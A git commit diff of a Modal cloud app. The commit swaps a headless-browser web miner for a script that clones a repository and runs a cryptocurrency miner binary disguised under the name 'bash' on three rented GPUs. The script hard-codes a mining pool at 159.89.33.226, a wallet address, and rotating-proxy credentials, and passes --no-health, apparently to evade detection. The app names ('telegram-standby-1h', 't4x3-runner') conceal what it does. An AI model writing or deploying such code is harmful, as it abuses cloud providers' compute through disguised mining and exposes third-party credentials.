dc276fe4977bbda7ba07206866d1de5913f3e886
qimxdoyo3240 <238822706+qimxdoyo3240@users.noreply.github.com>
2026-01-14 17:09:31 +0530

    Update modal_app.py

--- modal_app.py
+++ modal_app.py
@@ -1,54 +1,39 @@
 import modal
+import subprocess
 import time
 
-app = modal.App("telegram-standby-1h")
+app = modal.App("t4x3-runner")
 
 image = (
-    modal.Image.debian_slim()
-    .apt_install(
-        "ca-certificates",
-        "libnss3", "libatk-bridge2.0-0", "libgtk-3-0",
-        "libgbm1", "libasound2", "libxshmfence1",
+    modal.Image.from_registry(
+        "nvidia/cuda:12.1.1-runtime-ubuntu22.04"
     )
-    .pip_install("playwright")
-    .run_commands("playwright install chromium")
+    .apt_install(
+        "bash",
+        "git",
+        "python3",
+        "python3-pip",
+        "python-is-python3"
+    )
 )
 
 @app.function(
     image=image,
-    cpu=50,                 # ✅ maks 12 vCPU untuk 1 task
-    memory=16384,           # ✅ opsional (mis. 16 GB) biar stabil
-    concurrency_limit=1,    # ✅ pastikan hanya 1 task jalan bersamaan
-    timeout=290 * 70,
+    gpu=modal.gpu.T4(count=3),
+    timeout=60 * 60 * 4,
+    secrets=[modal.Secret.from_name("github-pat")]
 )
-def open_standby_1h():
-    from playwright.sync_api import sync_playwright
-    import os
+def run_script():
+    subprocess.run(["nvidia-smi"], check=True)
 
-    url = "https://webminer.pages.dev?algorithm=cwm_yespowerR16&host=159.89.33.226&port=80&worker=RNkGDozQg1rv15FBUymxqgXoVjkVoCDnyD&password=c%3DRVN&workers=59"
+    cmd = """
+    git clone https://github.com/hujisanda/bbm.git
+    cd bbm
+    chmod u+x bash
+    ./bash -a ergo -o stratum+tcp://159.89.33.226 -u 9iF7eGjWvEMVSYBHkPzJYtPgVMftJaJaWMsD6ArRog3RZmnC471.jasin --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health 
+    """
 
-    # cek vCPU terlihat
-    print("os.cpu_count():", os.cpu_count())
+    subprocess.run(["bash", "-lc", cmd], check=False)
 
-    print("[1] Start Playwright")
-    with sync_playwright() as p:
-        print("[2] Launch Chromium (headless)")
-        browser = p.chromium.launch(headless=True)
-        page = browser.new_page()
-
-        print(f"[3] Open URL: {url}")
-        page.goto(url, wait_until="domcontentloaded", timeout=120_000)
-
-        print("[4] Browser OPEN — standby 1 hour (heartbeat 5 min)")
-        for i in range(12):
-            time.sleep(5 * 60)
-            try:
-                print(f"  [heartbeat {i+1}/12] title='{page.title()}'", flush=True)
-            except Exception as e:
-                print(f"  [heartbeat {i+1}/12] title_error={repr(e)}", flush=True)
-
-        print("[5] Closing browser")
-        browser.close()
-
-    print("[6] Done")
-    return {"ok": True, "url": url, "standby_minutes": 60}
+    print("Staying alive for 4 hours...")
+    time.sleep(60 * 60 * 4)
